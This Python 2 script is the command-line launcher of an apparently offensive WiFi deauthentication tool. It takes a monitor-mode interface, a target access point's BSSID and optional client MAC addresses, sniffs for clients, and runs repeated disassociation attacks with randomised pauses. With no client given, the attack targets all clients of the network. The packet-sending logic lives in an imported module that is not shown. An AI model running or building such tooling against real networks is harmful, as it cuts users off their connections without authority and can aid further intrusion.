import logging

from argparse import ArgumentParser

from attack.exceptions import AttackException


def parse_options():
    parser = ArgumentParser()
    
    parser.add_argument("-i", "--interface", dest="interface", action="store",
                        type=str, required=True,
                        help="interface to sniff and inject packets (must have monitor mode enabled)")
    
    parser.add_argument("-b", "--bssid", dest="bssid", action="store",
                        type=str, required=True,
                        help="MAC address of the targeted access point")
    
    parser.add_argument("-c", "--client", dest="client", action="store",
                        default='', type=str,
                        help = "MAC address of a single client to direct the attack (if none, a disassociation attack against all clients will be attempted)")
    
    parser.add_argument("-s", "--sniff", action="store_true", dest="should_sniff",
                        help="whether to sniff packets in order to gather client addresses")        

    parser.add_argument("-t", "--timeout", action="store", dest="timeout",
                        default=60, type=int,
                        help="number of seconds to sniff packets (defaults to 60; only meaningful if -s is used)")

    parser.add_argument("-e", "--executions", action="store", dest="executions",
                        default=1, type=int,
                        help="number of attack executions to perform (defaults to 1)")
    
    parser.add_argument("-p", "--persistence_times", action="store", dest="persistence_times",
                        default=None, type=int, nargs=2,
                        help="min and max number of seconds to wait between attack executions, separated by spaces (defaults to 5,10)")
    
    parser.add_argument("-v", "--verbose", action="store_true", dest="verbose",
                        help="increase detail level of information printed out by the application")    
    
    options = parser.parse_args()

    if options.persistence_times is None:
        options.persistence_times = [5,10]
    elif options.persistence_times[0] > options.persistence_times[1]:
        options.persistence_times = options.persistence_times[::-1]
        
    logging_level = logging.DEBUG if options.verbose else logging.CRITICAL
    logging.basicConfig(format='%(levelname)s: %(message)s',
                        level=logging_level)
    
    return options

def main():
    options = parse_options()
    # This is to suppress Scapy warning messages (import has to be done after
    # the following line).
    logging.getLogger('scapy.runtime').setLevel(logging.ERROR)    
    from attack.builder import WiFiDeauthAttackBuilder
    attack = WiFiDeauthAttackBuilder.build_from(options)
    
    try:
        attack.run()
    except AttackException, e:
        logging.log(logging.CRITICAL, e.message)


if __name__ == '__main__':
    main()